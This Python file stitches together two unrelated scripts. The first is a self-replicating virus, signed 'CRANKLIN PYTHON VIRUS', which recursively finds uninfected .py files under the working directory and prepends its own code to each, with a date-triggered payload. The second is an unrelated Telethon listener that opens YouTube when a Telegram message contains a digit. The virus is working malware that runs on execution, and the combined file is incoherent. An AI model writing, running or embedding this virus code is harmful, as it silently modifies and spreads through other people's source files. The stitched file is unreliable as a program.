import os
import datetime
SIGNATURE = "CRANKLIN PYTHON VIRUS"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print ("HAPPY BIRTHDAY CRANKLIN!)")
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()
    
import configparser
from telethon import TelegramClient
from telethon.events import NewMessage
import asyncio
import webbrowser

# Define a function to handle incoming messages
async def handle_new_messages(event: NewMessage.Event):
    message = event.message
    print(f"New message received: '{message.message}'")

    # Check if the message contains a number
    if any(char.isdigit() for char in message.message):
        print("Message contains a number. Opening YouTube...")
        # Open YouTube in a new browser tab
        webbrowser.open_new_tab("https://www.youtube.com/")


async def main():
    # Read configuration from config.ini
    config = configparser.ConfigParser()
    config.read("config.ini")

    # Setting configuration values
    api_id = config['Telegram']['api_id']
    api_hash = config['Telegram']['api_hash']
    phone = config['Telegram']['phone']
    username = config['Telegram']['username']

    # Create the client and connect
    client = TelegramClient(username, api_id, api_hash)
    await client.start()
    print("Client Created")

    # Ensure you're authorized
    if not await client.is_user_authorized():
        await client.send_code_request(phone)
        try:
            await client.sign_in(phone, input('Enter the code: '))
        except Exception as e:
            print(f"Error signing in: {e}")
            return

    # Get entity (chat or channel) to listen to
    entity_input = input('Enter entity (Telegram URL or entity id): ')
    try:
        entity = await client.get_entity(entity_input)
    except ValueError:
        print("Invalid entity. Please provide a valid entity.")
        await client.disconnect()
        return
    except Exception as e:
        print(f"Error getting entity info: {e}")
        await client.disconnect()
        return

    # Add event handler to handle new messages in the specified entity
    client.add_event_handler(handle_new_messages, event=NewMessage(incoming=True, chats=[entity]))

    print("Listening for new messages...")
    await client.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
